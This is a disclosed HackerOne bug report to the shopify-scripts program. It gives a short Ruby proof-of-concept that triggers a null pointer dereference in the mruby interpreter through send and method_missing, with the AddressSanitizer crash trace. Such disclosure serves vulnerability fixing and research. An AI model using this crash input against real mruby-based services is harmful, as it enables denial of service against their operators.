# Null pointer dereference with send/method_missing

## Report Details
- **Report ID**: 242354
- **URL**: https://hackerone.com/reports/242354
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-06-22T14:38:45.944Z
- **Disclosed**: 2017-06-23T17:12:50.311Z

## Reporter
- **Username**: titanous
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
The following program triggers a null pointer dereference with mruby b200c747:

```ruby
def method_missing(m)
ensure
begin A rescue
break
rescue
end
end

send ''
```

ASAN report:

```text
ASAN:DEADLYSIGNAL
=================================================================
==12116==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x00000051bfaa bp 0x7fff4a650cd0 sp 0x7fff4a648a80 T0)
    #0 0x51bfa9 in mrb_vm_exec /home/vagrant/mruby/src/vm.c:1427:9
    #1 0x510c6a in mrb_vm_run /home/vagrant/mruby/src/vm.c:879:12
    #2 0x541b3f in mrb_top_run /home/vagrant/mruby/src/vm.c:2884:12
    #3 0x6569ff in mrb_load_exec /home/vagrant/mruby/mrbgems/mruby-compiler/core/parse.y:5823:7
    #4 0x657685 in mrb_load_file_cxt /home/vagrant/mruby/mrbgems/mruby-compiler/core/parse.y:5832:10
    #5 0x4f3a61 in main /home/vagrant/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227:11
    #6 0x7f256672ef44 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21f44)
    #7 0x41a5c5 in _start (/home/vagrant/mruby/bin/mruby+0x41a5c5)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /home/vagrant/mruby/src/vm.c:1427:9 in mrb_vm_exec
==12116==ABORTING
```

## Attachments
No attachments
